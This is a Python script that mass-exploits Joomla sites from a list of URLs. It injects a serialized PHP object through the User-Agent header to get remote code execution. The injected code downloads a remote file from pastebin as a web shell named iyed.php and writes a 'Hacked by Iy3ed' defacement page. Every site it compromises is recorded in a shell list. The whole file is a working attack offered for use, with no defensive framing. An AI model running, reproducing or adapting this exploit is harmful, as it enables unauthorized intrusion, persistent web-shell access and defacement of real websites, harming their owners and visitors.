import requests #  easy_install requests
import sys
fil=open(sys.argv[1],"r")

def get_url(url, user_agent):
 
    headers = {
    'User-Agent': user_agent
    }
    cookies = requests.get(url,headers=headers).cookies
    for _ in range(3):
        response = requests.get(url, headers=headers,cookies=cookies)    
    return response.content
   
def php_str_noquotes(data):
    "Convert string to chr(xx).chr(xx) for use in php"
    encoded = ""
    for char in data:
        encoded += "chr({0}).".format(ord(char))
 
    return encoded[:-1]
 
 
def generate_payload(php_payload):
 
    php_payload = "eval({0})".format(php_str_noquotes(php_payload))
 
    terminate = '\xf0\xfd\xfd\xfd';
    exploit_template = r'''}__test|O:21:"JDatabaseDriverMysqli":3:{s:2:"fc";O:17:"JSimplepieFactory":0:{}s:21:"\0\0\0disconnectHandlers";a:1:{i:0;a:2:{i:0;O:9:"SimplePie":5:{s:8:"sanitize";O:20:"JDatabaseDriverMysql":0:{}s:8:"feed_url";'''
    injected_payload = "{};JFactory::getConfig();exit".format(php_payload)    
    exploit_template += r'''s:{0}:"{1}"'''.format(str(len(injected_payload)), injected_payload)
    exploit_template += r''';s:19:"cache_name_function";s:6:"assert";s:5:"cache";b:1;s:11:"cache_class";O:20:"JDatabaseDriverMysql":0:{}}i:1;s:4:"init";}}s:13:"\0\0\0connection";b:1;}''' + terminate
 
    return exploit_template
 
pl = generate_payload("fwrite(fopen($_SERVER['DOCUMENT_ROOT'].'/iyed.php','w+'),file_get_contents('http://pastebin.com/raw/hFH9FhQu')); fwrite(fopen($_SERVER['DOCUMENT_ROOT'].'/x.htm','w+'),'Hacked by Iy3ed');")
for i in fil.readlines():
  try:
    i=i.strip()
    print get_url(i, pl)
    lala=requests.get(i+"/x.htm")
    if "Hacked" in lala.content:
     z=open('Joomla_3.5_Shell.txt','a')
     z.write(i+"/iyed.php\n")
     z.close()
  except:
    pass
    
fil.close()
